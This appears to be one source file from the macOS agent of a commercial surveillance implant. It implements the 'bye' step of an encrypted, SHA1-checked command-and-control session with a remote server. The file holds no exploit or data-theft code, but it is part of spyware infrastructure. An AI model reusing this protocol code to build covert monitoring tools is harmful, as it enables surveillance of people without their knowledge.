/*
 * RCSMac - Bye Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "ByeNetworkOperation.h"
#import "RCSMCommon.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"
#import "NSData+SHA1.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


@implementation ByeNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport  = aTransport;
      
#ifdef DEBUG_BYE_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      
      return self;
    }
  
  return nil;
}

- (BOOL)perform
{
#ifdef DEBUG_BYE_NOP
  infoLog(@"");
#endif
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  BOOL success = NO;
  
  uint32_t command = PROTO_BYE;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
#ifdef DEBUG_BYE_NOP
  infoLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_BYE_NOP
  infoLog(@"reply: %@", replyDecrypted);
#endif
  
  uint32_t protoCommand;
  @try
    {
      [replyDecrypted getBytes: &protoCommand
                         range: NSMakeRange(0, sizeof(int))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"exception on sha makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_BYE_NOP
      errorLog(@"exception on sha makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
#ifdef DEBUG_BYE_NOP
  infoLog(@"shaRemote: %@", shaRemote);
  infoLog(@"shaLocal : %@", shaLocal);
#endif
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
#ifdef DEBUG_BYE_NOP
      errorLog(@"sha mismatch");
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  if (protoCommand == PROTO_OK)
    {
      success = YES;
    }
  
  [commandData release];
  [replyDecrypted release];
  [outerPool release];
  
  return success;
}

@end